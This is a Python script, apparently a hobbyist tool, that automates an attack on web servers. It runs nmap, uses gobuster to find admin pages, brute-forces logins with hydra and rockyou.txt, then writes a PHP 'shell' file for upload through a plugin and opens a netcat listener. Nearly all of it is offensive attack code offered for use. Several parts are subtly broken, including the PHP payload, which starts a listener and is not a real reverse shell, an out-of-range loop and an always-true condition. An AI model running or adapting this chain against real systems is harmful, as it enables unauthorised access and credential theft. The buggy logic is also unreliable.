import os
import platform

def check_tools():
    a=[]
    #tools used: nmap,gobuster,curl,hydra,grep
    #checking if nmap is installed and put the errors and everything to a file named NUL
    a.append(os.system("nmap --version > NUL 2>&1"))
    #checking if gobuster is installed and put the errors and everything to a file named NUL
    a.append(os.system("gobuster --help> NUL 2>&1"))
    #checking if grep is installed and put the errors and everything to a file named NUL
    a.append(os.system("grep --version > NUL 2>&1"))
    #checking if hydra is installed and put the errors and everything to a file named NUL
    a.append(os.system("hydra --version > NUL 2>&1"))
    #removing the file,it's no longer needed
    os.system("rm NUL")
    #proccess of installing eveything
    sum=0
    for i in range(0,4):
        sum+=a[i]
    if sum > 0:
        print("Do you want to continue and install the tools or exit? [y/n]\n")
        answer=str(input(""))
        while(answer != "y" and answer != "Y" and answer != "n" and answer != "N"):
            print("answer must be y or n [y for continue and n for exit]\n")
            answer=str(input(""))
        if answer=="y" or answer == "Y":
            print("You will need to give super user password to install them\n")
            installed=[]
            tools=["nmap","gobuster","grep","hydra"]
            for i in range(0,5):
                if a[i]!=0:
                    installed.append(os.system("sudo apt install {}".format(tools[i])))
            #if the list is empty then all the tools have been installed
            if not installed:
                #succesful installation
                return 0
            else:
                #failed installation to one or more tools
                return 8
        else:
            #exiting the tool if the user want's to install them manually or stop the tool
            print("exiting...\n")
            return 9

#checking if linux is running
os_running=platform.system()
if os_running=="Linux":
    #checking if all tools are install,if not we install them or we exit
    tools=check_tools()
    if tools != 8 and tools != 9:
        print("Give the targets ip\n")
        target_ip=str(input(""))
        #nmap scanning for services,with default script,arggresive mode and os search all outputed to a file
        os.system("nmap -sV -sC -T4 -A {} > nmap_output.txt".format(target_ip))
        #we search for the Apache server and append the results to a file
        os.system("grep '80/tcp open http Apache httpd'  nmap_output.txt > grep_output.txt")
        #we remove the output of nmap,it's no longer needed
        os.system("rm nmap_output.txt")
        #we open the file in read mode
        file="grep_output.txt"
        #checking if file is empty
        if os.path.getsize(file) == 0:
            print("No Apache server found\n")
        else:
            #gobuster turn
            print("For default wordlist type d else give the path name\n")
            path=str(input(""))
            #default paths on wordlists
            if path=="d" or path=="D":
                #default path on linux systems
                path="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            #starting gobuster and putting output to gobuster_output.txt file
            os.system("gobuster dir -u http://{} -w {} > gobuster_output.txt".format(target_ip,path))
            #using grep we find patterns matching for admin pages and put them to a new file named admin_pages.txt
            os.system("grep 'http://{}/admin' gobuster_output.txt > admin_pages.txt".format(target_ip))
            os.system("grep 'http://{}/Admin' gobuster_output.txt > admin_pages.txt".format(target_ip))
        #removing the grep_output.txt it's no longer needed
        os.system("rm grep_output.txt")
        #checking if file is empty
        if os.path.getsize(filename="admin_pages.txt") == 0:
            #no admin pages found if file is empty
            print("No admin page found\n")
        else:
            #else we try to 
            print("Print checking for basic codes and passwords if are valid")
            print("Give the url from the file admin_pages.txt\n")
            admin=str(input(""))
            os.system("hydra -L /usr/share/wordlists/brutespray/rlogin/user -P /usr/share/wordlists/brutespray/rlogin/password {} http-post-form \"/login:username=^USER^&password=^PASS^:F=Incorrect username or password\"".format(admin))
            print("If no matched user and password found you can try rockyou.txt\n")
            print("continue searching? [y/n]\n")
            answer_hydra=str(input(""))
            while answer_hydra !="y" and answer_hydra !="Y" and answer_hydra !="n" and answer_hydra !="N":
                print("asnwer must be y or n to continue or not\n")
                answer_hydra=str(input(""))
            #hydra attack if user agrees
            if answer_hydra =="y" or answer_hydra !="Y":
                #creation of custom username list
                f=open("custom.txt","w")
                usernames=["admin\n","root\n","Admin\n","Root\n","user\n","User\n"]
                for i in usernames:
                    f.write(i)
                #end of creation
                f.close()
                #start attack with hydra
                os.system("hydra -L custom.txt -P /usr/share/wordlists/rockyou.txt {} http-post-form \"/login:username=^USER^&password=^PASS^:F=Incorrect username or password\"".format(admin))
                #removing admin_pages.txt it's no longer needed
                os.system("rm admin_pages.txt custom.txt")
                print("If any username and passowrd is valid test them\n")
                print("If you have entered,find any vulnerable plugin that is written in php, it's going to have .php in the end\n")
                print("if You found it give the command (give php code) so you will get a code that the server might be vulnerable else type (exit)\n")
                answer_pass=str(input(""))
                while answer_pass != "give php code" and answer_pass != "exit":
                    print("look above for the answer requiremnts\n")
                    answer_pass=str(input(""))
                #if user gives as answer give php code then it means that he is admin in the web page and we create a small code written in php to open
                #a communication channel with netcat
                if answer_pass =="give php code":
                    print("If you are the admin then the code will be simpler,are you the admin when you enter the username and password?\n [y/n]")
                    answer_admin=str(input(""))
                    while answer_admin != "y" and answer_admin != "Y" and answer_admin != "n" and answer_admin != "N":
                        print("y is for admin privilages and n is for just user privilages\n")
                        answer_admin=str(input(""))
                    if answer_admin == "y" or answer_admin == "Y":
                        #asking for specific port
                        port=str(input("Give the port for the server to way connection\n"))
                        #start of code creation
                        file_php=open("shell.php","w")
                        file_php.write("<?php\nsystem(\"nc -nlvp {}\")\n>".format(port))
                        file_php.close()
                        print("If it doesn't work then find a code on the internet with this term (php reverse shell) and put it in the plugin\n")
                        print("we wait for the connection? [y/n]\n")
                        connection_reverse=str(input(""))
                        while connection_reverse != "y" and connection_reverse != "Y" and connection_reverse != "n" and connection_reverse != "N":
                            print("y is to wait for the reverse shell and n is to stop\n")
                            connection_reverse=str(input(""))
                        #if user answers y then we open the listening mode which is hopefully going to return a reverse shell
                        if connection_reverse =="y" or connection_reverse == "Y":
                            print("If a shell will spawn it's up to you any more to see what you can do\n")
                            os.system("nc -nlvp {}".format(port))
                        else:
                            print("Till here it was a good try,see you next time\n")
    elif tools ==8:
        print("Something went wrong will installing the tools\n")
else:
    print("You don't use linux so you can't run the app\n")